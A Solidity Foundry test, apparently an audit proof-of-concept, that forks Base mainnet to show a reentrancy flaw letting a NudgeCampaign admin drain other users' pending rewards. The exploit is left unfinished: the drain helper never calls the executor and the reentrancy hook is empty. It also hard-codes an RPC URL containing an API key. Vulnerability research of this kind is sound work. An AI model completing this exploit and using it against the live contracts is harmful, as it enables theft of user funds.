// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
import {NudgeCampaign} from "../campaign/NudgeCampaign.sol";
import {NudgeCampaignFactory} from "../campaign/NudgeCampaignFactory.sol";
import {INudgeCampaign, IBaseNudgeCampaign} from "../campaign/interfaces/INudgeCampaign.sol";
import "../mocks/TestERC20.sol";
import {console} from "forge-std/console.sol";

//High Issue: Demo Campaign admin can drain/withdraw pending rewards from other user.
contract ArchiveDebugTest is Test {
    using Math for uint256;
    //@ Using this transaction as Fork sample
    //https://basescan.org/tx/0xe11e8013db2118413b91e9281dd253ab0cb4dcb3782567262ab362aebdb7d033

    address internal constant NATIVE_ASSETID = address(0); //address(0)

    NudgeCampaignFactory public factory = NudgeCampaignFactory(0xbe915C930437302162621ad948289F4DE84c9F20);
    IExecutor public executor = IExecutor(0x4DaC9d1769b9b304cb04741DCDEb2FC14aBdF110);

    ERC20 public USDC = ERC20(0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913);
    ERC20 public DAI = ERC20(0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb);

    address constant NATIVE_TOKEN = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    function setUp() public {
        //fork Base at 27754800
        uint256 forkBlock = 27754800;
        string memory rpcURL =
            "https://rpc.ankr.com/base/9f6e5db150bd7716e21a60eb9acc6f3909c10e43797deb81c8f8d9cc60dcaecc"; //@random free EVM account
        uint256 forkId = vm.createFork(rpcURL, forkBlock);
        vm.selectFork(forkId);

        console.log("----------");

        vm.label(address(factory), "NudgeCampaignFactory");
        vm.label(address(executor), "Li.fi Executor");
    }

    function test_debug() public {
        CampaignManager campaignManager = new CampaignManager(factory, executor);
        address user = makeAddr("User1");
        address exploiter = makeAddr("Exploit");
        // campaignManager create new campaign with ETH as rewards and 7 days holding period

        uint256 rewardPPQ = 5000e15; //for 1 ether you get 5000 of reward token
        address targetToken = NATIVE_TOKEN;
        address rewardToken = address(USDC);
        uint256 initialRewardAmount = 10_000e6;

        vm.startPrank(exploiter);
        //fund rewards with 10_000 USDC
        deal(address(USDC), address(campaignManager), initialRewardAmount);
        campaignManager.createCampaign(
            7 days, targetToken, rewardToken, rewardPPQ, exploiter, 0, address(0), initialRewardAmount, 0
        );
        skip(1 days);

        NudgeCampaign campaign = campaignManager.campaign();
        console.log("new campagin claimable rewards %e", campaign.claimableRewardAmount());
        console.log("rewards 1e18 ETH = %e", campaign.getRewardAmountIncludingFees(1e18));

        //user send in 1 ether to campaign and get 5000 USDC in pending rewards
        vm.startPrank(address(executor));
        uint userTokenBalance = 1e18;
        deal(address(executor), userTokenBalance);
        campaign.handleReallocation{value: 1e18}(campaign.campaignId(), user, campaign.targetToken(), 1e18, bytes(""));
        //pending rewards is 5000 USDC
        console.log("pending rewards %e", campaign.pendingRewards());
        console.log("claimable rewards %e", campaign.claimableRewardAmount());
        assertEq(campaign.pendingRewards(), 5000e6 * 90 / 100); //10% fee
        assertEq(campaign.claimableRewardAmount(), 5000e6);

        // Original campaignManager can drain pending rewards by reentrancy
        vm.startPrank(exploiter);
        deal(exploiter, userTokenBalance); //get some eth to drain exact amount of user

    }
}

contract CampaignManager {
    NudgeCampaignFactory public factory;
    NudgeCampaign public campaign;
    IExecutor public executor ;

    constructor(NudgeCampaignFactory _facotry, IExecutor _executor) {
        factory = _facotry;
        executor = _executor;
    }

    function createCampaign(
        uint32 holdingPeriodInSeconds,
        address targetToken,
        address rewardToken,
        uint256 rewardPPQ,
        address campaignAdmin,
        uint256 startTimestamp,
        address alternativeWithdrawalAddress,
        uint256 initialRewardAmount,
        uint256 uuid
    ) public {
        ERC20(rewardToken).approve(address(factory), type(uint256).max);
        address newCampaign = factory.deployAndFundCampaign(
            holdingPeriodInSeconds,
            targetToken,
            rewardToken,
            rewardPPQ,
            campaignAdmin,
            startTimestamp,
            alternativeWithdrawalAddress,
            initialRewardAmount,
            uuid
        );
        campaign = NudgeCampaign(payable(newCampaign));
    }
    //callback during handleReallocation allowing campaign manager to steal pending rewards
    function drainPendingRewardsWithETH(uint amount) public payable {
        //call Executor trigger reallocation
        address user = msg.sender; //exploiter address
        address targetToken = campaign.targetToken();
        IExecutor.SwapData[] memory swapData = new IExecutor.SwapData[](1);
        uint256 campaignId = campaign.campaignId();
        // uint drainAmount = campaign.claimableRewardAmount();
        bytes memory encodedHandleReallocation = abi.encodeWithSelector(
            NudgeCampaign.handleReallocation.selector, campaignId, user, address(targetToken), amount, bytes("0x")
        );
        swapData[0] = IExecutor.SwapData({
            callTo: address(campaign),
            approveTo: address(campaign),
            sendingAssetId: address(0),
            receivingAssetId: address(0),// ETH is sent to executor
            fromAmount: amount,
            callData: encodedHandleReallocation,
            requiresDeposit: false
        });
    }
    receive() external payable {
        //trigger reentrancy. drain all left over balance first
    }
}

interface IExecutor {
    struct SwapData {
        address callTo;
        address approveTo;
        address sendingAssetId;
        address receivingAssetId;
        uint256 fromAmount;
        bytes callData;
        bool requiresDeposit;
    }

    function swapAndCompleteBridgeTokens(
        bytes32 _transactionId,
        SwapData[] calldata _swapData,
        address _transferredAssetId,
        address payable _receiver
    ) external;
    function swapAndExecute(
        bytes32 _transactionId,
        SwapData[] calldata _swapData,
        address _transferredAssetId,
        address payable _receiver,
        uint256 _amount
    ) external;
    function erc20Proxy() external returns (address);
}
